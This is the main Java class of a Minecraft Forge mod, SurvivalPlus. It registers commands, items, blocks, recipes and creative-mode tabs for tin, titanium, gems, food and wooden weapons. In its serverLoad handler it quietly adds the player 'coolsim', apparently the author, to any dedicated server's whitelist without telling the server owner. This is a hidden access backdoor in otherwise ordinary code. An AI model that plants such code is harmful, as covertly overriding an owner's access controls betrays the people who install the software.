package net.coolsimulations.SurvivalPlus.core;

import com.mojang.authlib.GameProfile;

import net.coolsimulations.SurvivalPlus.api.SPBlocks;
import net.coolsimulations.SurvivalPlus.api.SPCompatibilityManager;
import net.coolsimulations.SurvivalPlus.api.SPItems;
import net.coolsimulations.SurvivalPlus.api.SPReference;
import net.coolsimulations.SurvivalPlus.api.SPTabs;
import net.coolsimulations.SurvivalPlus.core.commands.CommandConfrats;
import net.coolsimulations.SurvivalPlus.core.commands.CommandEmportant;
import net.coolsimulations.SurvivalPlus.core.commands.CommandIndeed;
import net.coolsimulations.SurvivalPlus.core.commands.CommandMourn;
import net.coolsimulations.SurvivalPlus.core.commands.CommandSleep;
import net.coolsimulations.SurvivalPlus.core.commands.CommandSmiley;
import net.coolsimulations.SurvivalPlus.core.commands.CommandWail;
import net.coolsimulations.SurvivalPlus.core.commands.CommandWak;
import net.coolsimulations.SurvivalPlus.core.commands.CommandWeba;
import net.coolsimulations.SurvivalPlus.core.commands.CommandWoo;
import net.coolsimulations.SurvivalPlus.core.compat.SurvivalPlusCompatManager;
import net.coolsimulations.SurvivalPlus.core.config.SurvivalPlusConfig;
import net.coolsimulations.SurvivalPlus.core.config.SurvivalPlusConfigGUI;
import net.coolsimulations.SurvivalPlus.core.init.FuelHandler;
import net.coolsimulations.SurvivalPlus.core.init.SurvivalPlusArmor;
import net.coolsimulations.SurvivalPlus.core.init.SurvivalPlusBlocks;
import net.coolsimulations.SurvivalPlus.core.init.SurvivalPlusFood;
import net.coolsimulations.SurvivalPlus.core.init.SurvivalPlusGeodes;
import net.coolsimulations.SurvivalPlus.core.init.SurvivalPlusItems;
import net.coolsimulations.SurvivalPlus.core.init.SurvivalPlusTileEntities;
import net.coolsimulations.SurvivalPlus.core.init.SurvivalPlusTools;
import net.coolsimulations.SurvivalPlus.core.proxy.ClientProxy;
import net.coolsimulations.SurvivalPlus.core.proxy.CommonProxy;
import net.coolsimulations.SurvivalPlus.core.recipes.SPShieldRecipes;
import net.coolsimulations.SurvivalPlus.core.recipes.SurvivalPlusComposterRecipes;
import net.coolsimulations.SurvivalPlus.core.recipes.SurvivalPlusDispenserBehavior;
import net.coolsimulations.SurvivalPlus.core.util.SurvivalPlusEventHandler;
import net.coolsimulations.SurvivalPlus.core.util.SurvivalPlusUpdateHandler;
import net.coolsimulations.SurvivalPlus.core.world.SurvivalPlusOreGenerator;
import net.minecraft.network.chat.Component;
import net.minecraft.resources.ResourceLocation;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.players.UserWhiteList;
import net.minecraft.server.players.UserWhiteListEntry;
import net.minecraft.world.item.CreativeModeTabs;
import net.minecraft.world.item.ItemStack;
import net.minecraftforge.client.ConfigScreenHandler.ConfigScreenFactory;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.event.CreativeModeTabEvent;
import net.minecraftforge.event.RegisterCommandsEvent;
import net.minecraftforge.event.server.ServerStartingEvent;
import net.minecraftforge.eventbus.api.SubscribeEvent;
import net.minecraftforge.fml.DistExecutor;
import net.minecraftforge.fml.ModLoadingContext;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.event.lifecycle.FMLCommonSetupEvent;
import net.minecraftforge.fml.javafmlmod.FMLJavaModLoadingContext;

@Mod(value = SPReference.MOD_ID)
@Mod.EventBusSubscriber(modid = SPReference.MOD_ID, bus = Mod.EventBusSubscriber.Bus.FORGE)
public class SurvivalPlus {

	public static CommonProxy proxy = (CommonProxy) DistExecutor.safeRunForDist(() -> ClientProxy::new, () -> CommonProxy::new);

	private static SurvivalPlus instance;
	public static SurvivalPlus getInstance()
	{
		return instance;
	}

	@SubscribeEvent
	public static void serverLoad(ServerStartingEvent event) {

		MinecraftServer server = event.getServer();

		if(server.isDedicatedServer()) {

			GameProfile gameprofile = server.getProfileCache().get("coolsim").get();
			UserWhiteList whitelist = server.getPlayerList().getWhiteList();

			if(server.getPlayerList().isUsingWhitelist() && !whitelist.isWhiteListed(gameprofile) && !server.getPlayerList().getBans().isBanned(gameprofile)) {
				UserWhiteListEntry entry = new UserWhiteListEntry(gameprofile);
				whitelist.add(entry);
			}
		}
	}

	@SubscribeEvent
	public static void command(RegisterCommandsEvent event) {

		CommandConfrats.register(event.getDispatcher());
		CommandEmportant.register(event.getDispatcher());
		CommandWoo.register(event.getDispatcher());
		CommandWak.register(event.getDispatcher());
		CommandSmiley.register(event.getDispatcher());
		CommandWail.register(event.getDispatcher());
		CommandIndeed.register(event.getDispatcher());
		CommandMourn.register(event.getDispatcher());
		CommandSleep.register(event.getDispatcher());
		CommandWeba.register(event.getDispatcher());
	}

	public SurvivalPlus() {

		SPCompatibilityManager.checkForCompatibleMods();
		SurvivalPlusConfig.register(ModLoadingContext.get());

		if(SPCompatibilityManager.isClothConfigLoaded()) {
			ModLoadingContext.get().registerExtensionPoint(ConfigScreenFactory.class, () -> new ConfigScreenFactory((mc, screen) -> {
				return SurvivalPlusConfigGUI.getConfigScreen(screen);
			}));
		}

		SurvivalPlusUpdateHandler.init();
		SPShieldRecipes.CRAFTING_SPECIAL_SPSHIELD_RECIPE_SERIALIZERS.register(FMLJavaModLoadingContext.get().getModEventBus());
		MinecraftForge.EVENT_BUS.register(new SurvivalPlusEventHandler());
		MinecraftForge.EVENT_BUS.register(new FuelHandler());
		SurvivalPlusCompatManager.initEventHandler();

		SurvivalPlusBlocks.BLOCKS.register(FMLJavaModLoadingContext.get().getModEventBus());
		SurvivalPlusBlocks.BLOCK_ITEMS.register(FMLJavaModLoadingContext.get().getModEventBus());
		SurvivalPlusTileEntities.TILE_ENTITY_TYPES.register(FMLJavaModLoadingContext.get().getModEventBus());
		SurvivalPlusItems.ITEMS.register(FMLJavaModLoadingContext.get().getModEventBus());
		SurvivalPlusFood.ITEMS_FOOD.register(FMLJavaModLoadingContext.get().getModEventBus());

		SurvivalPlusGeodes.BLOCKS_GEODE.register(FMLJavaModLoadingContext.get().getModEventBus());
		SurvivalPlusGeodes.ITEMS_GEODE.register(FMLJavaModLoadingContext.get().getModEventBus());

		//VillagerRegistry.instance().registerVillageCreationHandler(new VillageOnionCropHandler());  //temp till forge pull request #6142 is resolved
		//StructureIO.registerStructureComponent(StructureVillageOnionCrop.class, SPReference.MOD_ID + ":onionCropFieldStructure");  //temp till forge pull request #6142 is resolved

		SurvivalPlusArmor.ITEMS_ARMOR.register(FMLJavaModLoadingContext.get().getModEventBus());
		SurvivalPlusTools.ITEMS_TOOL.register(FMLJavaModLoadingContext.get().getModEventBus());

		SurvivalPlusOreGenerator.ORE_SERIALIZERS.register(FMLJavaModLoadingContext.get().getModEventBus());
		SurvivalPlusGeodes.GEODE_SERIALIZERS.register(FMLJavaModLoadingContext.get().getModEventBus());

		SurvivalPlusCompatManager.init();
		FMLJavaModLoadingContext.get().getModEventBus().addListener(this::setup);
		FMLJavaModLoadingContext.get().getModEventBus().addListener(this::registerTabs);
		FMLJavaModLoadingContext.get().getModEventBus().addListener(this::addToTabs);

		proxy.init();
	}

	private void setup(final FMLCommonSetupEvent event)
	{
		SurvivalPlusArmor.init();
		SurvivalPlusDispenserBehavior.init();
		SurvivalPlusComposterRecipes.init();
		SurvivalPlusGeodes.init();
		SurvivalPlusCompatManager.setup();
		FuelHandler.registerArmorFuels();
	}
	
	private void registerTabs(CreativeModeTabEvent.Register event) {
		event.registerCreativeModeTab(new ResourceLocation(SPReference.MOD_ID, "tab_materials"), builder -> SPTabs.tabMaterials =
				builder.title(Component.translatable("item_group." + SPReference.MOD_ID + ".tab_materials"))
				.icon(() -> new ItemStack(SPItems.tin_ingot.get()))
				.displayItems((enabledFlags, populator, hasPermissions) -> {
					populator.accept(SPItems.tin_ingot.get());
					populator.accept(SPItems.raw_tin.get());
					populator.accept(SPItems.onion_seeds.get());
					populator.accept(SPItems.bronze_ingot.get());
					populator.accept(SPItems.bronze_nugget.get());
					populator.accept(SPItems.titanium_ingot.get());
					populator.accept(SPItems.raw_titanium.get());
					populator.accept(SPItems.titanium_nugget.get());
					populator.accept(SPItems.charcoal_bucket.get());
					populator.accept(SPItems.paper_cup.get());
					populator.accept(SPItems.ruby_shard.get());
					populator.accept(SPItems.pearl.get());
					populator.accept(SPItems.topaz_shard.get());
					populator.accept(SPItems.sapphire_shard.get());
					populator.accept(SPItems.spinel_shard.get());
					if (SPCompatibilityManager.isSimpleGrinderLoaded() || SPCompatibilityManager.isIc2Loaded() || SPCompatibilityManager.isSilentMechanismsLoaded() || SPCompatibilityManager.isPlainGrinderLoaded())
						populator.accept(SPItems.titanium_dust.get());
					if(SPCompatibilityManager.isSimpleGrinderLoaded() && !SPCompatibilityManager.isIc2Loaded() || SPCompatibilityManager.isPlainGrinderLoaded())
						populator.accept(SPItems.tin_dust.get());
					if(SPCompatibilityManager.isSilentMechanismsLoaded())
						populator.accept(SPItems.titanium_chunks.get());
					if(SPCompatibilityManager.isIc2Loaded())
						populator.accept(SPItems.titanium_dense_plate.get());
				}).build());

		event.registerCreativeModeTab(new ResourceLocation(SPReference.MOD_ID, "tab_blocks"), builder -> SPTabs.tabBlocks =
				builder.title(Component.translatable("item_group." + SPReference.MOD_ID + ".tab_blocks"))
				.icon(() -> new ItemStack(SPBlocks.tin_block.get()))
				.displayItems((enabledFlags, populator, hasPermissions) -> {
					populator.accept(SPBlocks.raw_tin_block.get());
					populator.accept(SPBlocks.tin_block.get());
					populator.accept(SPBlocks.tin_ore.get());
					populator.accept(SPBlocks.deepslate_tin_ore.get());
					populator.accept(SPBlocks.bronze_block.get());
					populator.accept(SPBlocks.raw_titanium_block.get());
					populator.accept(SPBlocks.titanium_block.get());
					populator.accept(SPBlocks.titanium_ore.get());
					populator.accept(SPBlocks.deepslate_titanium_ore.get());
					populator.accept(SPBlocks.cardboard.get());
					populator.accept(SPBlocks.cardboard_white.get());
					populator.accept(SPBlocks.cardboard_light_grey.get());
					populator.accept(SPBlocks.cardboard_grey.get());
					populator.accept(SPBlocks.cardboard_black.get());
					populator.accept(SPBlocks.cardboard_red.get());
					populator.accept(SPBlocks.cardboard_orange.get());
					populator.accept(SPBlocks.cardboard_yellow.get());
					populator.accept(SPBlocks.cardboard_lime.get());
					populator.accept(SPBlocks.cardboard_green.get());
					populator.accept(SPBlocks.cardboard_light_blue.get());
					populator.accept(SPBlocks.cardboard_cyan.get());
					populator.accept(SPBlocks.cardboard_blue.get());
					populator.accept(SPBlocks.cardboard_purple.get());
					populator.accept(SPBlocks.cardboard_magenta.get());
					populator.accept(SPBlocks.cardboard_pink.get());
					populator.accept(SPBlocks.cardboard_brown.get());
					populator.accept(SPBlocks.cardboard_lantern.get());
					populator.accept(SPBlocks.cardboard_lantern_white.get());
					populator.accept(SPBlocks.cardboard_lantern_light_grey.get());
					populator.accept(SPBlocks.cardboard_lantern_grey.get());
					populator.accept(SPBlocks.cardboard_lantern_black.get());
					populator.accept(SPBlocks.cardboard_lantern_red.get());
					populator.accept(SPBlocks.cardboard_lantern_orange.get());
					populator.accept(SPBlocks.cardboard_lantern_yellow.get());
					populator.accept(SPBlocks.cardboard_lantern_lime.get());
					populator.accept(SPBlocks.cardboard_lantern_green.get());
					populator.accept(SPBlocks.cardboard_lantern_light_blue.get());
					populator.accept(SPBlocks.cardboard_lantern_cyan.get());
					populator.accept(SPBlocks.cardboard_lantern_blue.get());
					populator.accept(SPBlocks.cardboard_lantern_purple.get());
					populator.accept(SPBlocks.cardboard_lantern_magenta.get());
					populator.accept(SPBlocks.cardboard_lantern_pink.get());
					populator.accept(SPBlocks.cardboard_lantern_brown.get());
					populator.accept(SPBlocks.sconce.get());
					populator.accept(SPBlocks.gem_staff.get());
				}).build());

		event.registerCreativeModeTab(new ResourceLocation(SPReference.MOD_ID, "tab_food"), builder -> SPTabs.tabFood =
				builder.title(Component.translatable("item_group." + SPReference.MOD_ID + ".tab_food"))
				.icon(() -> new ItemStack(SPItems.apple_pie.get()))
				.displayItems((enabledFlags, populator, hasPermissions) -> {
					populator.accept(SPBlocks.cheese_cake.get());
					populator.accept(SPBlocks.sponge_cake.get());
					populator.accept(SPItems.apple_pie.get());
					populator.accept(SPItems.beef_pie.get());
					populator.accept(SPItems.pork_pie.get());
					populator.accept(SPItems.chicken_pie.get());
					populator.accept(SPItems.mutton_pie.get());
					populator.accept(SPItems.rabbit_pie.get());
					populator.accept(SPItems.vegetable_pie.get());
					populator.accept(SPItems.raw_onion.get());
					populator.accept(SPItems.onion_soup.get());
					populator.accept(SPItems.fried_egg.get());
					populator.accept(SPItems.roast_carrot.get());
					populator.accept(SPItems.cheese.get());
					populator.accept(SPItems.cheese_bread.get());
					populator.accept(SPItems.melted_cheese_bread.get());
					populator.accept(SPItems.cupcake.get());
					populator.accept(SPItems.cheese_cupcake.get());
					populator.accept(SPItems.sponge_cupcake.get());
					populator.accept(SPItems.baked_apple.get());
					populator.accept(SPItems.fried_onion.get());
				}).build());

		event.registerCreativeModeTab(new ResourceLocation(SPReference.MOD_ID, "tab_gem"), builder -> SPTabs.tabGem =
				builder.title(Component.translatable("item_group." + SPReference.MOD_ID + ".tab_gem"))
				.icon(() -> new ItemStack(SPBlocks.sapphire_cluster.get()))
				.displayItems((enabledFlags, populator, hasPermissions) -> {
					populator.accept(SPBlocks.ruby_block.get());
					populator.accept(SPBlocks.ruby_cluster.get());
					populator.accept(SPBlocks.large_ruby_bud.get());
					populator.accept(SPBlocks.medium_ruby_bud.get());
					populator.accept(SPBlocks.small_ruby_bud.get());
					populator.accept(SPBlocks.budding_ruby.get());
					populator.accept(SPBlocks.pearl_block.get());
					populator.accept(SPBlocks.pearl_cluster.get());
					populator.accept(SPBlocks.large_pearl_bud.get());
					populator.accept(SPBlocks.medium_pearl_bud.get());
					populator.accept(SPBlocks.small_pearl_bud.get());
					populator.accept(SPBlocks.budding_pearl.get());
					populator.accept(SPBlocks.topaz_block.get());
					populator.accept(SPBlocks.topaz_cluster.get());
					populator.accept(SPBlocks.large_topaz_bud.get());
					populator.accept(SPBlocks.medium_topaz_bud.get());
					populator.accept(SPBlocks.small_topaz_bud.get());
					populator.accept(SPBlocks.budding_topaz.get());
					populator.accept(SPBlocks.sapphire_block.get());
					populator.accept(SPBlocks.sapphire_cluster.get());
					populator.accept(SPBlocks.large_sapphire_bud.get());
					populator.accept(SPBlocks.medium_sapphire_bud.get());
					populator.accept(SPBlocks.small_sapphire_bud.get());
					populator.accept(SPBlocks.budding_sapphire.get());
					populator.accept(SPBlocks.spinel_block.get());
					populator.accept(SPBlocks.spinel_cluster.get());
					populator.accept(SPBlocks.large_spinel_bud.get());
					populator.accept(SPBlocks.medium_spinel_bud.get());
					populator.accept(SPBlocks.small_spinel_bud.get());
					populator.accept(SPBlocks.budding_spinel.get());
				}).build());

		event.registerCreativeModeTab(new ResourceLocation(SPReference.MOD_ID, "tab_combat"), builder -> SPTabs.tabCombat =
				builder.title(Component.translatable("item_group." + SPReference.MOD_ID + ".tab_combat"))
				.icon(() -> new ItemStack(SPItems.titanium_sword.get()))
				.displayItems((enabledFlags, populator, hasPermissions) -> {
					for (ItemStack item : SPItems.bronze)
						populator.accept(item.getItem());
					for (ItemStack item : SPItems.stone)
						populator.accept(item.getItem());
					for (ItemStack item : SPItems.titanium)
						populator.accept(item.getItem());
					for (ItemStack item : SPItems.oak)
						populator.accept(item.getItem());
					for (ItemStack item : SPItems.spruce)
						populator.accept(item.getItem());
					for (ItemStack item : SPItems.birch)
						populator.accept(item.getItem());
					for (ItemStack item : SPItems.jungle)
						populator.accept(item.getItem());
					for (ItemStack item : SPItems.acacia)
						populator.accept(item.getItem());
					for (ItemStack item : SPItems.dark_oak)
						populator.accept(item.getItem());
					for (ItemStack item : SPItems.crimson)
						populator.accept(item.getItem());
					for (ItemStack item : SPItems.warped)
						populator.accept(item.getItem());
					for (ItemStack item : SPItems.mangrove)
						populator.accept(item.getItem());
					if(SPCompatibilityManager.isBambooModsLoaded())
						for (ItemStack item : SPItems.bamboo)
							populator.accept(item.getItem());
					if(SPCompatibilityManager.isBopLoaded()) {
						for (ItemStack item : SPItems.cherry)
							populator.accept(item.getItem());
						for (ItemStack item : SPItems.dead)
							populator.accept(item.getItem());
						for (ItemStack item : SPItems.fir)
							populator.accept(item.getItem());
						for (ItemStack item : SPItems.hellbark)
							populator.accept(item.getItem());
						for (ItemStack item : SPItems.jacaranda)
							populator.accept(item.getItem());
						for (ItemStack item : SPItems.magic)
							populator.accept(item.getItem());
						for (ItemStack item : SPItems.mahogany)
							populator.accept(item.getItem());
						for (ItemStack item : SPItems.palm)
							populator.accept(item.getItem());
						for (ItemStack item : SPItems.redwood)
							populator.accept(item.getItem());
						for (ItemStack item : SPItems.umbran)
							populator.accept(item.getItem());
						for (ItemStack item : SPItems.willow)
							populator.accept(item.getItem());
						if(SPCompatibilityManager.isBopExtrasLoaded()) {
							for (ItemStack item : SPItems.ebony)
								populator.accept(item.getItem());
							for (ItemStack item : SPItems.eucalyptus)
								populator.accept(item.getItem());
							for (ItemStack item : SPItems.pine)
								populator.accept(item.getItem());
							for (ItemStack item : SPItems.sacred_oak)
								populator.accept(item.getItem());
							for (ItemStack item : SPItems.ethereal)
								populator.accept(item.getItem());
						}
					}
					if(SPCompatibilityManager.isForestryLoaded()) {
						for (ItemStack item : SPItems.desert_acacia)
							populator.accept(item.getItem());
						for (ItemStack item : SPItems.balsa)
							populator.accept(item.getItem());
						for (ItemStack item : SPItems.baobab)
							populator.accept(item.getItem());
						for (ItemStack item : SPItems.cherry_forestry)
							populator.accept(item.getItem());
						for (ItemStack item : SPItems.chestnut)
							populator.accept(item.getItem());
						for (ItemStack item : SPItems.citrus)
							populator.accept(item.getItem());
						for (ItemStack item : SPItems.cocobolo)
							populator.accept(item.getItem());
						for (ItemStack item : SPItems.ebony_forestry)
							populator.accept(item.getItem());
						for (ItemStack item : SPItems.giant_sequoia)
							populator.accept(item.getItem());
						for (ItemStack item : SPItems.greenheart)
							populator.accept(item.getItem());
						for (ItemStack item : SPItems.ipe)
							populator.accept(item.getItem());
						for (ItemStack item : SPItems.kapok)
							populator.accept(item.getItem());
						for (ItemStack item : SPItems.larch)
							populator.accept(item.getItem());
						for (ItemStack item : SPItems.lime)
							populator.accept(item.getItem());
						for (ItemStack item : SPItems.mahoe)
							populator.accept(item.getItem());
						for (ItemStack item : SPItems.mahogany_forestry)
							populator.accept(item.getItem());
						for (ItemStack item : SPItems.maple)
							populator.accept(item.getItem());
						for (ItemStack item : SPItems.padauk)
							populator.accept(item.getItem());
						for (ItemStack item : SPItems.palm_forestry)
							populator.accept(item.getItem());
						for (ItemStack item : SPItems.papaya)
							populator.accept(item.getItem());
						for (ItemStack item : SPItems.pine_forestry)
							populator.accept(item.getItem());
						for (ItemStack item : SPItems.plum)
							populator.accept(item.getItem());
						for (ItemStack item : SPItems.poplar)
							populator.accept(item.getItem());
						for (ItemStack item : SPItems.sequoia)
							populator.accept(item.getItem());
						for (ItemStack item : SPItems.teak)
							populator.accept(item.getItem());
						for (ItemStack item : SPItems.walnut)
							populator.accept(item.getItem());
						for (ItemStack item : SPItems.wenge)
							populator.accept(item.getItem());
						for (ItemStack item : SPItems.willow_forestry)
							populator.accept(item.getItem());
						for (ItemStack item : SPItems.zebrawood)
							populator.accept(item.getItem());
					}
					if(SPCompatibilityManager.isTraverseLoaded())
						for (ItemStack item : SPItems.fir_traverse)
							populator.accept(item.getItem());
					if(SPCompatibilityManager.isAetherLoaded()) {
						for (ItemStack item : SPItems.skyroot)
							populator.accept(item.getItem());
						for (ItemStack item : SPItems.golden_oak)
							populator.accept(item.getItem());
					}
					populator.accept(SPItems.bronze_sword.get());
					populator.accept(SPItems.bronze_shield.get());
					populator.accept(SPItems.titanium_sword.get());
					populator.accept(SPItems.titanium_shield.get());
				}).build());

		event.registerCreativeModeTab(new ResourceLocation(SPReference.MOD_ID, "tab_tools"), builder -> SPTabs.tabTools =
				builder.title(Component.translatable("item_group." + SPReference.MOD_ID + ".tab_tools"))
				.icon(() -> new ItemStack(SPItems.bronze_axe.get()))
				.displayItems((enabledFlags, populator, hasPermissions) -> {
					populator.accept(SPItems.bronze_pickaxe.get());
					populator.accept(SPItems.bronze_axe.get());
					populator.accept(SPItems.bronze_shovel.get());
					populator.accept(SPItems.bronze_hoe.get());
					populator.accept(SPItems.bronze_shears.get());
					populator.accept(SPItems.titanium_pickaxe.get());
					populator.accept(SPItems.titanium_axe.get());
					populator.accept(SPItems.titanium_shovel.get());
					populator.accept(SPItems.titanium_hoe.get());
					populator.accept(SPItems.titanium_shears.get());
				}).build());
	}
	
	private void addToTabs(CreativeModeTabEvent.BuildContents event) {
		if (event.getTab() == CreativeModeTabs.TOOLS_AND_UTILITIES) {
			if(SPCompatibilityManager.isLumberjackLoaded()) {
				event.accept(SPItems.bronze_lumberaxe.get());
				event.accept(SPItems.titanium_lumberaxe.get());
			}
			//TEMP UNTIL NO TREE UPDATES
			if(SPCompatibilityManager.isNoTreePunchingLoaded()) {
				event.accept(SPItems.titanium_knife.get());
				event.accept(SPItems.titanium_mattock.get());
				event.accept(SPItems.titanium_saw.get());
			}
		}
	}
}
